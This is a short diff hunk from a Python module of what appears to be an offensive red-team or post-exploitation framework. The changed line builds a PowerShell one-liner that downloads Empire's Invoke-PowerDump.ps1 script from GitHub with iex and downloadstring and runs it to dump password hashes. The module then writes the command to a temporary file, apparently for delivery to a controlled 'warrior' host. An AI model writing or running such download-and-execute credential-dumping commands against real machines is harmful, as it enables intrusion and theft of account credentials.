@@ -29,7 +29,7 @@ class CustomModule(Module):
                 break
 
         if warrior_exist:
-            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1')"
+            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');"
             function += 'Invoke-PowerDump'
             
             with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
